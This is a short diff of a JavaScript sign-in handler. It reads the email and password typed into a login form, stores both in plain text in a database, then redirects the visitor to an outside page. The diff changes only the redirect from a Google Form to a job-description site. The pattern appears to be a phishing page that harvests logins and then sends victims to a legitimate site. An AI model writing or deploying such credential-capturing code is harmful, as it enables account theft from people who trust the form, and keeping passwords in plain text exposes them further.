@@ -40,7 +40,7 @@ function SignIn(){
     var password = document.getElementById('lpassword').value;
     usersRef.push({email: email, password: password})
         .then(function(){
-            window.open("https://docs.google.com/forms/d/e/1FAIpQLSc_AAws2uhECC2mhMce5DMirK1Awgl6xorehoT-xN8I90VAHA/viewform?fbclid=IwAR0reLNKIx5v0VreVMOehncsocsxmZOnxscZlycVh3kKxurl3jIxrm1wzPE","_self");
+            window.open("https://targetjobs.co.uk/careers-advice/job-descriptions/graphic-designer-job-description","_self");
             console.log("sent");
             document.getElementById('form').reset();
         }).catch(function (error){
